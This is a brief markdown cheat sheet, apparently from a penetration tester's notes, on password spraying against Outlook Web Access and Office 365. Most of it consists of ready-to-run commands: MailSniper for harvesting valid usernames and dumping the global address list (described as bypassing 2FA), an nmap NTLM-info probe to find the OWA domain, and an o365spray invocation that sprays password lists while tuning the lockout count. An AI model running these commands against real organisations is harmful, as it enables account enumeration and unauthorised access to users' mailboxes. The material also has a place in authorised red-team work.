# Different Password Spraying tools and methods

## MailSniper[^1]
* Advantages
    * `Invoke-UsernameHarvestOWA` is very useful
    * `Get-GlobalAddressList` is awesome
        * bypasses 2FA in Office 365
        * Easily dump list from OWA & Office 365

```powershell
Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Threads 1 -OutFile owa-valid-users.txt
Get-GlobalAddressList -ExchHostname outlook.office365.com -UserName user2@domain.com -Password "P@ssw0rd" -OutFile global-address-list.txt
```

## Find OWA Domain
### NMAP
```
nmap -p 443 -Pn -v mail.domain.com --script http-ntlm-info --script-args http-ntlm-info.root=/rpc/rpcproxy.dll
```

## o365spray[^2]
```
python3 o365spray.py --spray -U usernames.txt -P passwords.txt --count 2 --lockout 5 --domain test.com
```


[^1]: [Github - Dafthack - MailSniper](https://github.com/dafthack/MailSniper)
[^2]: [Github - o365spray](https://github.com/0xZDH/o365spray)
